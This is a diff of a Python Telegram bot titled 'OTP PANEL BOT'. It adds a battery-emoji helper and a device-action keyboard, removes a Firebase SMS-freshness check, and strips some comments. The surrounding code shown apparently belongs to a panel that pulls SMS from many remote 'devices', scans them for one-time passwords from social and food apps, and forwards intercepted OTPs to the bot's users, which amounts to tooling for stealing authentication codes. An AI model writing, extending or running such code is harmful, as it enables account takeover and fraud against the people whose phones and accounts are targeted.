@@ -4,6 +4,7 @@
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
   FAST-SKIP LOGIC (HIT & RUN) | RAILWAY SMOOTH ENGINE
   AUTO-CHECK INBOX LINKING | 1500+ PANELS AUTO-LOADER 
+  BATTERY EMOJI FIX APPLIED
 ══════════════════════════════════════════════════════
 """
 
@@ -192,6 +193,13 @@ async def start_dummy_server():
 # ==========================================
 # 🛠 UTILITIES & CACHE
 # ==========================================
+
+# 🔥 FIXED: Added bat_emoji function
+def bat_emoji(battery: int) -> str:
+    if battery >= 80: return "🔋"
+    if battery >= 30: return "🪫"
+    return "🔌"
+
 def init_dirs():
     os.makedirs(USERS_DIR, exist_ok=True)
     os.makedirs(CLONES_DIR, exist_ok=True)
@@ -482,21 +490,6 @@ async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
         except Exception:
             return None 
 
-# 🔥 5-MIN & 30-MIN FRESH FIX (verify_recent_sms function restored) 🔥
-async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
-    try:
-        session = await get_http_session()
-        url = build_fb_url(device.base_url, device.sms_path, auth=device.auth, query='orderBy="%24key"&limitToLast=1')
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
-            if r.status == 200:
-                data = await r.json(content_type=None)
-                if isinstance(data, dict) and len(data) > 0:
-                    max_sms_ts = max((float(v.get("timestamp") or 0) for v in data.values() if isinstance(v, dict)), default=0)
-                    if max_sms_ts > 1e11: max_sms_ts /= 1000
-                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_seconds: return True
-    except: pass
-    return False
-
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     clean_number = re.sub(r"\D", "", str(number))[-10:]
     api_keys = SYS_SETTINGS.get("api_keys", [])
@@ -751,6 +744,12 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
 
+def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
+        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
+    ])
+
 def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
@@ -953,7 +952,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ==========================================
-# 📩 CORE TELEGRAM HANDLERS (WITH INBOX LINKING)
+# 📩 CORE TELEGRAM HANDLERS
 # ==========================================
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1022,7 +1021,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             async def edit_reply(txt, parse_mode="HTML"): await safe_edit(query, txt, parse_mode=parse_mode)
             if not await enforce_access(ctx, chat_id, edit_reply): return
             
-        # 🔥 FIX: DIRECTLY OPEN INBOX FROM AUTO-CHECK LIST 🔥
         if data.startswith("search_num:"):
             number = data.split(":")[1]
             device = await find_device_by_number(number, bot_token, chat_id, users_db)
@@ -1056,7 +1054,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
             return
 
-        # 🔥 FIX: AUTO CHECK LIST GENERATION WITH INLINE BUTTONS 🔥
         if data.startswith("auto_fb:"):
             service = data.split(":")[1]
             await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait...</i>", parse_mode="HTML")
